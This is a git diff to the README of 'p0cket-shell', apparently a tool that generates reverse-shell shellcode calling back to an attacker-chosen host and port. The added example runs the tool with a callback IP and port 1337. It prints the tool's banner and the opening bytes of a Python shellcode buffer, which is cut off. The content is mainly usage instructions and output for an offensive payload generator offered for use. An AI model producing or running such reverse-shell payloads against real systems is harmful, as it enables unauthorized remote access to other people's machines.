@@ -25,6 +25,7 @@ usage: p0cket-shell.py [-h] --payload {hardcode,resolve} --LHOST LHOST --LPORT L
 ```
 
 ### Setup
+
 ```powershell
 git clone https://github.com/SilenitsVox/p0cket-shell
 cd p0cket-shell
@@ -32,12 +33,34 @@ python p0cket-shell.py
 ```
 
 ### Usage
+
 ```powershell
 p0cket-shell.py --payload  [hardcode | resolve]
                 --LHOST    [callback ip]
                 --LPORT    [callback port]
                 --format   [c | powershell | python | exe | raw]
                [--output]  example.py
+```
+
+### Example
+
+```powershell
+.\p0cket-shell.py -p hardcode -lh 192.168.1.190 -lp 1337 -f python
+            ____       __        __             __         ____
+     ____  / __ \_____/ /_____  / /_      _____/ /_  ___  / / /
+    / __ \/ / / / ___/ //_/ _ \/ __/_____/ ___/ __ \/ _ \/ / /
+   / /_/ / /_/ / /__/ ,< /  __/ /_/_____(__  ) / / /  __/ / /
+  / .___/\____/\___/_/|_|\___/\__/     /____/_/ /_/\___/_/_/
+ /_/
+ Author: SilentisVox
+ Github: https://github.com/SilentisVox/p0cket-shell
+
+[*] Payload size: 278 bytes
+[*] Final size of python file: 1387 bytes
+buf  = b""
+buf += b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40"
+buf += b"\x18\x48\x8b\x40\x30\x48\x8b\x00\x48\x8b\x00\x48"
+buf += ...
 ```
 
 ## How it works
